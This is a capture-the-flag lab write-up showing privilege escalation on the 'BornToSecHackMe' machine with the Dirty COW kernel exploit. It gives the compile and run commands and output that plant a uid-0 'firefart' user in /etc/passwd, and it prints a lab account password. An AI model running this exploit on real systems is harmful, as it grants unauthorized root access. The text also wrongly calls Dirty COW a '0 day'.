continuing from writeup1 where we have a shell access on laurie account using `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`

since the system is 5 years old, there are probably multiples vulnerabilities that we can exploit.
one of the most known 0 day is dirtycow, which exploit a race condition in the kernel to gain root access, by allowing writing to read-only files using `mmap`.

there a plenty of implementations of this vulnerability, we will this one `https://github.com/firefart/dirtycow` because it does everything for us, by creating a new root user into /etc/passwd.

```bash
$ gcc -pthread dirty.c -o dirty -lcrypt
$ ./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password:
Complete line:
firefart:fi6bS9A.C7BDQ:0:0:pwned:/root:/bin/bash

mmap: b7fda000
madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'test'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'test'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
laurie@BornToSecHackMe:~$ su
Password:
firefart@BornToSecHackMe:/home/laurie# whoami
firefart
```

and firefart is now root, with a uid of 0.
